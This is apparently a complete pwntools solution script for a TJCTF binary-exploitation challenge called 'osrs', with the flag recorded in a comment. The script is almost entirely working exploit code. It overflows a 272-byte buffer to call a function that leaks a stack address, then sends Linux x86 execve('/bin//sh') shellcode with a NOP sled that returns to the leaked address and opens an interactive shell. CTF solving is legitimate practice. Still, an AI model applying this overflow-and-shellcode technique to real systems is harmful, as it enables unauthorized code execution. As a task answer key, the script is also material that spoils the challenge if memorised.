from pwn import *

r = process('./osrs') 

offset = 272
get_tree_addr = 0x8048546

payload = ""
payload += "A"*offset
payload += p32(get_tree_addr)

r.recvuntil('type:')
r.sendline(payload)

leak = int(r.recvuntil(':(').splitlines()[-1].split(' ')[-2]) & 0xffffffff
log.info('Leaked address: {}'.format(hex(leak)))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = ""
payload += shellcode
payload += "\x90" * (272-len(shellcode))
payload += p32(leak)

r.recvuntil('type:')
r.sendline(payload)

r.interactive()

# flag: tjctf{tr33_c0de_in_my_she115}
